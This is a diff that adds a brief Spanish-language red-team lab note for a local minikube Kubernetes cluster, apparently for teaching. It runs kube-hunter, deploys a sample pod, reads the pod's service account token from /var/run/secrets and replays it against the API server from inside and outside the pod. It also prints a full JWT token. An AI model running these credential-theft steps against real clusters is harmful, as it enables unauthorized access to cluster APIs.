@@ -1,1 +1,25 @@
+Red Team Kubernetes:
+
+minikube start
+
+docker run -it --rm --network host aquasec/kube-hunter
+
+Elegir 1 y poner la minikube ip o elegir el punto 2
+
+curl -k https://192.168.49.2:8443/api/v1
+
+kubectl apply -fhttps://raw.githubusercontent.com/diegochavezcarro/kube-labs/main/deploy.yml
+kubectl get pods
+kubectl exec -it hello-deploy-57844dd6f7-4mnsm -- sh
+
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+
+export TOKEN=`cat /var/run/secrets/kubernetes.io/serviceaccount/token`
+
+curl -k -H "Authorization: Bearer $TOKEN"  https://kubernetes
+
+Afuera de ese pod:
+
+curl -k -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IlNiU3h1aHEtS0dMblU2OVMxRXlKMWdfcVpBQjRvSDB2WXBFU2lfUGJpNnMifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjk4MzQwOTQ4LCJpYXQiOjE2NjY4MDQ5NDgsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJoZWxsby1kZXBsb3ktNTc4NDRkZDZmNy00bW5zbSIsInVpZCI6ImYwZDRhNDhhLWJkYmUtNGZhNS1iNWI5LTI4YzA5MDQ4OWFhZiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjUyYzQ3NmEyLTQyNzYtNDExZi05NzFjLWVmMzUyMmVmYjU3NyJ9LCJ3YXJuYWZ0ZXIiOjE2NjY4MDg1NTV9LCJuYmYiOjE2NjY4MDQ5NDgsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.J2KOLRPVPZyja1iPaANd_Dxl2SO3iDs7JZDv2dnojsduQAHt35BJqX7g7HGEEmyRFTuSWahPHaz-htZS3XZSxo25pn3NcYnYrVzU1QLnjHHnxdiRUzSQXCV890OW2JGwxNVNrATb50Rmn-GxetGvJItqBETfYm0hXnibCBJnkrqjHewoVBBRkeDvz6HyoOUgXpeeH71uhHOP3qIL9scY5rQ8Wwz-XZvsn3wYD6PyTWTb1hP3gjQSeucuCaSi-oIGgTViBNFTHXvcQ55VBfisYFt4xLp_qWsucP3yOVXSidJuj8d27kuvrFghaObDu68h3rEu66ANksPKdabU_t8FKw"  https://192.168.49.2:8443/api/v1
+
 
